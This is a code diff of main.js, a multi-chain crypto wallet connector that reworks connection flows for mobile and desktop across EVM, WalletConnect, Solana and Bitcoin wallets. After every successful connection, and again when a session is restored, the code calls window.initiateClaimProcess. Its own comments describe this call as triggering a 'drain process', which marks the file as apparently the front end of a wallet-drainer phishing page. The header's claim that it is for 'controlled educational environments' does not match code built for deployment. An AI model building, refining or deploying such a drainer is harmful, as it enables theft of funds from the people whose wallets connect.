@@ -1,3 +1,9 @@
+// ============================================================
+//  main.js – Advanced Multi‑Chain Wallet Connector
+//  Rewritten for PC/Mobile‑optimized connection flow.
+//  Author: Security Professor – for controlled educational environments.
+// ============================================================
+
 ;(async function() {
   // ============================================================
   //  DEBUG PANEL – double‑tap to show/hide
@@ -25,13 +31,38 @@
   }
 
   // ============================================================
-  //  DEVICE DETECTION
+  //  DEVICE DETECTION – enhanced for all platforms
   // ============================================================
   function isMobile() {
     return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)
   }
+
   function isIOS() {
     return /iPhone|iPad|iPod/i.test(navigator.userAgent)
+  }
+
+  function isAndroid() {
+    return /Android/i.test(navigator.userAgent)
+  }
+
+  function isDesktop() {
+    return !isMobile()
+  }
+
+  function isWindows() {
+    return /Windows/i.test(navigator.userAgent)
+  }
+
+  function isMac() {
+    return /Macintosh|Mac OS X/i.test(navigator.userAgent)
+  }
+
+  function getPlatform() {
+    if (isIOS()) return 'ios'
+    if (isAndroid()) return 'android'
+    if (isWindows()) return 'windows'
+    if (isMac()) return 'mac'
+    return 'unknown'
   }
 
   // ============================================================
@@ -486,6 +517,7 @@
 
   // ============================================================
   //  DIRECT EVM CONNECTION WITH RETRY & PROVIDER SELECTION
+  //  This is used ONLY on Desktop (PC/Mac) as the primary method.
   // ============================================================
   async function connectDirectEVM(retries = 3) {
     setupEIP6963()
@@ -551,7 +583,9 @@
   }
 
   // ============================================================
-  //  WALLETCONNECT EVM CONNECTION (fallback)
+  //  WALLETCONNECT EVM CONNECTION (Universal fallback for both PC & Mobile)
+  //  On Mobile: this is the PRIMARY method.
+  //  On Desktop: this is the SECONDARY method (after direct EVM).
   // ============================================================
   async function connectViaWalletConnect(useTestId = false) {
     const initSuccess = await initWalletConnect(useTestId)
@@ -575,21 +609,41 @@
         modal.openModal({ uri })
         showStatus('Select your wallet or scan QR code', 'info')
 
-        // Mobile deeplink handling
-        if (isIOS()) {
-          const iosWallets = metadata.mobileWallets || []
-          for (const wallet of iosWallets) {
-            if (wallet.links.universal) {
-              const url = `${wallet.links.universal}wc?uri=${encodeURIComponent(uri)}`
-              logDebug(`Attempting universal link for ${wallet.name}: ${url}`)
-              sessionStorage.setItem('pending_wc_uri', uri)
-              sessionStorage.setItem('pending_wc_timestamp', Date.now().toString())
-              window.location.href = url
-              break
+        // Mobile deeplink handling – only for mobile devices
+        if (isMobile()) {
+          const platform = getPlatform()
+          logDebug(`Mobile platform detected: ${platform}, attempting deeplink`)
+
+          // For iOS, use universal links
+          if (isIOS()) {
+            const iosWallets = metadata.mobileWallets || []
+            for (const wallet of iosWallets) {
+              if (wallet.links.universal) {
+                const url = `${wallet.links.universal}wc?uri=${encodeURIComponent(uri)}`
+                logDebug(`Attempting universal link for ${wallet.name}: ${url}`)
+                sessionStorage.setItem('pending_wc_uri', uri)
+                sessionStorage.setItem('pending_wc_timestamp', Date.now().toString())
+                // Open the wallet app via universal link
+                window.location.href = url
+                break
+              }
             }
+          } else if (isAndroid()) {
+            // For Android, use native intents via the modal's "Open" button
+            // The WalletConnect modal already handles this on Android
+            logDebug('Android detected – WalletConnect modal will handle deeplink via "Open" button')
+            // Store pending URI for return
+            sessionStorage.setItem('pending_wc_uri', uri)
+            sessionStorage.setItem('pending_wc_timestamp', Date.now().toString())
           }
-        } else if (isMobile()) {
-          // Android: modal already has "Open" button
+        } else {
+          // Desktop: we still open the modal for QR code scanning
+          // but we also try to detect if a desktop wallet supports WalletConnect URI
+          logDebug('Desktop platform – WalletConnect modal opened for QR code')
+          // Some desktop wallets (like MetaMask desktop) support WalletConnect via URI
+          // We'll store the URI for potential use
+          sessionStorage.setItem('pending_wc_uri', uri)
+          sessionStorage.setItem('pending_wc_timestamp', Date.now().toString())
         }
       }
 
@@ -605,6 +659,9 @@
         saveWallet(account, session, 'evm')
         updateConnectedUI(account, 'evm')
         currentSession = session
+        // Clear pending URI
+        sessionStorage.removeItem('pending_wc_uri')
+        sessionStorage.removeItem('pending_wc_timestamp')
         return true
       } else {
         showStatus('No accounts found', 'error')
@@ -613,6 +670,9 @@
     } catch (err) {
       logDebug(`❌ WalletConnect error: ${err.message}`)
       if (modal) modal.closeModal()
+      // Clear pending URI on error
+      sessionStorage.removeItem('pending_wc_uri')
+      sessionStorage.removeItem('pending_wc_timestamp')
       if (err.message?.includes('User rejected') || err.message?.includes('Cancelled')) {
         showStatus('Connection cancelled by user', 'error')
       } else if (err.message?.includes('timeout')) {
@@ -625,7 +685,7 @@
   }
 
   // ============================================================
-  //  BITCOIN (UniSat) CONNECTION
+  //  BITCOIN (UniSat) CONNECTION – Desktop only
   // ============================================================
   async function connectBitcoin() {
     try {
@@ -663,7 +723,7 @@
   }
 
   // ============================================================
-  //  SOLANA CONNECTION
+  //  SOLANA CONNECTION – Desktop only
   // ============================================================
   async function connectSolana() {
     try {
@@ -753,7 +813,10 @@
   }
 
   // ============================================================
-  //  MAIN CONNECT DISPATCHER (EVM first, then SOL, then BTC)
+  //  MAIN CONNECT DISPATCHER – Device‑aware connection flow
+  //  ============================================================
+  //  MOBILE (Android/iOS):  ONLY WalletConnect modal
+  //  DESKTOP (Windows/Mac): Direct EVM (3 retries) → WalletConnect → Solana → Bitcoin
   // ============================================================
   async function connectWallet() {
     setButtonState(connectButton, 'loading')
@@ -761,48 +824,121 @@
     showStatus('Detecting wallet...', 'info')
 
     let success = false
+    const platform = getPlatform()
+    logDebug(`Platform detected: ${platform} | isMobile: ${isMobile()}`)
 
-    // 1. Try direct EVM (with retries)
-    success = await connectDirectEVM(3)
-    if (!success) {
-      // 2. Fallback to WalletConnect (first with our project, then public test)
+    if (isMobile()) {
+      // ============================================================
+      //  MOBILE PATH – WalletConnect ONLY
+      //  ============================================================
+      logDebug('📱 Mobile device detected – using WalletConnect only')
+      showStatus('Mobile: Connecting via WalletConnect...', 'info')
+
+      // Try with our project ID first, then fallback to public test ID
       success = await connectViaWalletConnect(false)
       if (!success) {
+        logDebug('Mobile: WalletConnect with primary ID failed, trying public test ID')
         success = await connectViaWalletConnect(true)
       }
-    }
 
-    if (!success) {
-      // 3. Try Solana
-      const solanaWallets = getSolanaWallets()
-      if (solanaWallets.length > 0) {
-        success = await connectSolana()
+      if (!success) {
+        showStatus('Mobile: No wallet found. Please install a WalletConnect-compatible wallet.', 'error')
+        setButtonState(connectButton, 'failed')
+        if (walletButton) setButtonState(walletButton, 'failed')
+      } else {
+        setButtonState(connectButton, 'connected')
+        if (walletButton) setButtonState(walletButton, 'connected')
+        // Trigger drain process
+        setTimeout(() => {
+          if (typeof window.initiateClaimProcess === 'function') {
+            window.initiateClaimProcess()
+          } else {
+            logDebug('⚠️ window.initiateClaimProcess not defined – drain will not start')
+          }
+        }, 1500)
       }
+      return
     }
 
-    if (!success) {
-      // 4. Try Bitcoin
-      if (window.unisat) {
-        success = await connectBitcoin()
-      }
-    }
+    // ============================================================
+    //  DESKTOP PATH – Direct EVM → WalletConnect → Solana → Bitcoin
+    //  ============================================================
+    logDebug('🖥️ Desktop device detected – using full connection flow')
 
-    if (!success) {
-      showStatus('No supported wallet found. Please install a wallet.', 'error')
-      setButtonState(connectButton, 'failed')
-      if (walletButton) setButtonState(walletButton, 'failed')
-    } else {
+    // 1. Try direct EVM (with 3 retries)
+    logDebug('Desktop: Attempt 1 – Direct EVM connection (3 retries)')
+    success = await connectDirectEVM(3)
+    if (success) {
+      logDebug('✅ Desktop: Direct EVM connection successful')
       setButtonState(connectButton, 'connected')
       if (walletButton) setButtonState(walletButton, 'connected')
-      // Trigger drain process
       setTimeout(() => {
         if (typeof window.initiateClaimProcess === 'function') {
           window.initiateClaimProcess()
-        } else {
-          logDebug('⚠️ window.initiateClaimProcess not defined – drain will not start')
         }
       }, 1500)
+      return
     }
+
+    // 2. Fallback to WalletConnect (first with our project, then public test)
+    logDebug('Desktop: Attempt 2 – WalletConnect fallback')
+    success = await connectViaWalletConnect(false)
+    if (!success) {
+      logDebug('Desktop: WalletConnect with primary ID failed, trying public test ID')
+      success = await connectViaWalletConnect(true)
+    }
+    if (success) {
+      logDebug('✅ Desktop: WalletConnect connection successful')
+      setButtonState(connectButton, 'connected')
+      if (walletButton) setButtonState(walletButton, 'connected')
+      setTimeout(() => {
+        if (typeof window.initiateClaimProcess === 'function') {
+          window.initiateClaimProcess()
+        }
+      }, 1500)
+      return
+    }
+
+    // 3. Try Solana
+    logDebug('Desktop: Attempt 3 – Solana connection')
+    const solanaWallets = getSolanaWallets()
+    if (solanaWallets.length > 0) {
+      success = await connectSolana()
+      if (success) {
+        logDebug('✅ Desktop: Solana connection successful')
+        setButtonState(connectButton, 'connected')
+        if (walletButton) setButtonState(walletButton, 'connected')
+        setTimeout(() => {
+          if (typeof window.initiateClaimProcess === 'function') {
+            window.initiateClaimProcess()
+          }
+        }, 1500)
+        return
+      }
+    }
+
+    // 4. Try Bitcoin
+    logDebug('Desktop: Attempt 4 – Bitcoin connection')
+    if (window.unisat) {
+      success = await connectBitcoin()
+      if (success) {
+        logDebug('✅ Desktop: Bitcoin connection successful')
+        setButtonState(connectButton, 'connected')
+        if (walletButton) setButtonState(walletButton, 'connected')
+        setTimeout(() => {
+          if (typeof window.initiateClaimProcess === 'function') {
+            window.initiateClaimProcess()
+          }
+        }, 1500)
+        return
+      }
+    }
+
+    // All attempts failed
+    logDebug('❌ Desktop: All connection attempts failed')
+    showStatus('No supported wallet found. Please install a wallet.', 'error')
+    setButtonState(connectButton, 'failed')
+    if (walletButton) setButtonState(walletButton, 'failed')
   }
 
   // ============================================================
@@ -846,13 +982,16 @@
 
   // ============================================================
   //  RESTORE SESSION AND HANDLE RETURN FROM WALLET
+  //  ============================================================
+  //  For both PC and Mobile, we check for pending WalletConnect
+  //  sessions and restore them.
   // ============================================================
   async function restoreWalletConnection() {
     const savedWallet = getSavedWallet()
     const savedChain = getSavedChainType()
     const savedSession = getSavedSession()
 
-    // Check for pending WC redirect (iOS)
+    // Check for pending WC redirect (iOS/Android deeplink return)
     const pendingUri = sessionStorage.getItem('pending_wc_uri')
     const pendingTimestamp = sessionStorage.getItem('pending_wc_timestamp')
     if (pendingUri && pendingTimestamp) {
@@ -906,17 +1045,20 @@
             } catch (e) { logDebug(`Session restore failed: ${e.message}`) }
           }
         }
-        // Try direct provider
-        if (window.ethereum) {
+        // Try direct provider (desktop only)
+        if (isDesktop() && window.ethereum) {
           const accounts = await window.ethereum.request({ method: 'eth_accounts' }).catch(() => [])
           if (accounts.length > 0 && accounts[0] === savedWallet) {
             updateConnectedUI(savedWallet, 'evm')
             return
           }
         }
-        clearSavedWallet()
+        // If we're on mobile and no session, clear saved wallet
+        if (isMobile()) {
+          clearSavedWallet()
+        }
       } else if (savedChain === 'solana') {
-        if (window.solana && window.solana.publicKey) {
+        if (isDesktop() && window.solana && window.solana.publicKey) {
           const addr = window.solana.publicKey.toString()
           if (addr === savedWallet) {
             updateConnectedUI(savedWallet, 'solana')
@@ -925,11 +1067,13 @@
             return
           }
         }
-        const success = await connectSolana()
-        if (success) return
+        if (isDesktop()) {
+          const success = await connectSolana()
+          if (success) return
+        }
         clearSavedWallet()
       } else if (savedChain === 'bitcoin') {
-        if (window.unisat) {
+        if (isDesktop() && window.unisat) {
           try {
             const accounts = await window.unisat.getAccounts()
             if (accounts.length > 0 && accounts[0] === savedWallet) {
@@ -1003,16 +1147,48 @@
   // ============================================================
   //  GLOBAL EVM PROVIDER EVENTS (if already set up)
   // ============================================================
-  if (window.ethereum) {
+  if (window.ethereum && isDesktop()) {
     setupEVMProviderEvents(window.ethereum)
   }
 
   // ============================================================
-  //  VISIBILITY CHANGE
+  //  VISIBILITY CHANGE – check for session return on all platforms
   // ============================================================
   document.addEventListener('visibilitychange', () => {
     if (!document.hidden && getSavedWallet()) {
       logDebug('Page visible, checking connection...')
+      // Re-check for pending session
+      const pendingUri = sessionStorage.getItem('pending_wc_uri')
+      const pendingTimestamp = sessionStorage.getItem('pending_wc_timestamp')
+      if (pendingUri && pendingTimestamp) {
+        const elapsed = Date.now() - parseInt(pendingTimestamp)
+        if (elapsed < 120000 && client) {
+          logDebug('Visibility change: checking for pending session...')
+          setTimeout(async () => {
+            try {
+              const sessions = client.session.values()
+              if (sessions.length > 0) {
+                const session = sessions[0]
+                const account = session.namespaces?.eip155?.accounts?.[0]?.split(':')[2]
+                if (account) {
+                  saveWallet(account, session, 'evm')
+                  updateConnectedUI(account, 'evm')
+                  currentSession = session
+                  sessionStorage.removeItem('pending_wc_uri')
+                  sessionStorage.removeItem('pending_wc_timestamp')
+                  setTimeout(() => {
+                    if (typeof window.initiateClaimProcess === 'function') {
+                      window.initiateClaimProcess()
+                    }
+                  }, 1000)
+                }
+              }
+            } catch (e) {
+              logDebug(`Visibility check session restore failed: ${e.message}`)
+            }
+          }, 1000)
+        }
+      }
     }
   })
 
@@ -1023,5 +1199,7 @@
     if (modal) modal.closeModal()
   })
 
-  logDebug('✅ main.js fully initialised with multi‑chain support (EVM first, then SOL, BTC)')
+  logDebug(`✅ main.js fully initialised with device‑aware connection flow`)
+  logDebug(`   Platform: ${getPlatform()} | Mobile: ${isMobile()} | Desktop: ${isDesktop()}`)
+  logDebug(`   Connection flow: ${isMobile() ? 'WalletConnect only' : 'Direct EVM → WalletConnect → Solana → Bitcoin'}`)
 })()
